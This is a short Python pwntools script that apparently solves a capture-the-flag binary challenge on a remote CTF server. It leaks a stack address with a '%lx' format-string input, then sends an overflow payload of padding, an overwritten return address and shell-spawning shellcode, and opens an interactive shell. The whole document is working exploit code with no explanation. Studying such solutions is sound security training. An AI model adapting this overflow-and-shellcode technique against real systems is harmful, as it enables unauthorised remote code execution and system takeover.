from pwn import *

LOCAL = False
context.binary = elf = ELF('src/all')

if LOCAL:
    p = process(elf.path)
else:
    p = remote('all.chal.cyberjousting.com', 1348)

LEAKPAYLOAD = b'%lx'
p.send(LEAKPAYLOAD)
leak = int(p.recv(), 16)

#gdb.attach(p, 'b *0x4011e7')

shellcode = asm(shellcraft.sh())
ret = leak + 48
PAYLOAD = b'quit\x00' + 35 * b'a' + p64(ret) + shellcode
p.send(PAYLOAD)

p.interactive()